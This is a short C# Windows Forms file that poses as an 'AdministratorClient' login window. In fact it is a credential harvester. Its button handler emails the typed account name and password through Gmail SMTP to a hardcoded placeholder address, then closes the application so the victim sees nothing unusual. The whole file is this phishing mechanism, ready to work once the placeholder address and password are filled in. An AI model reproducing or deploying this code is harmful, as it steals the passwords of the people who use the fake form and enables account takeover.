using System;
using System.Windows.Forms;
using System.Net.Mail;

namespace AdministratorClient
{
    public partial class AdminClient : Form
    {
        SmtpClient smtpServer = new SmtpClient();
        MailMessage mail = new MailMessage();

        public AdminClient()
        {
            InitializeComponent();
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            smtpServer.Credentials = new System.Net.NetworkCredential("YOUR.EMAIL", "EMAILPASSWORD");
            smtpServer.Port = 587;
            smtpServer.Host = "smtp.gmail.com";
            smtpServer.EnableSsl = true;
            mail.From = new MailAddress("YOUR.EMAIL");
            mail.To.Add("YOUR.EMAIL");
            mail.Subject = "Account info";
            mail.Body = "Account: " + TextBoxUser.Text + " Password: " + TextBoxPass.Text;
            smtpServer.Send(mail);
            Application.Exit();
        }
    }
}